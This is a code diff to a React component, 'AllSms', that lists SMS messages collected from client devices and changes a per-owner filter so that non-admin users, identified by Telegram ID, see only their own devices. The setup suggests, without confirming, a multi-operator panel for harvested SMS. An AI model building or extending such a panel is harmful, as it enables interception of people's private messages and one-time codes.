@@ -87,8 +87,8 @@ export function AllSms() {
 
       Object.entries(messagesData).forEach(([deviceId, smsList]) => {
         const device = clientsData[deviceId] || {};
-        // Per-user filter (non-admin only sees their own)
-        if (!isAdmin && device.ownerTelegramId && device.ownerTelegramId !== userId) return;
+        // Per-user filter — non-admin sees ONLY their own devices
+        if (!isAdmin && device.ownerTelegramId !== userId) return;
         if (!smsList || typeof smsList !== 'object') return;
 
         Object.entries(smsList as Record<string, any>).forEach(([pushKey, sms]) => {
@@ -113,7 +113,7 @@ export function AllSms() {
       // Also include legacy sms stored under clients/{id}/sms
       Object.entries(clientsData).forEach(([deviceId, device]) => {
         if (!device.sms) return;
-        if (!isAdmin && device.ownerTelegramId && device.ownerTelegramId !== userId) return;
+        if (!isAdmin && device.ownerTelegramId !== userId) return;
         // Skip if already covered by messages path
         if (messagesData[deviceId]) return;
 
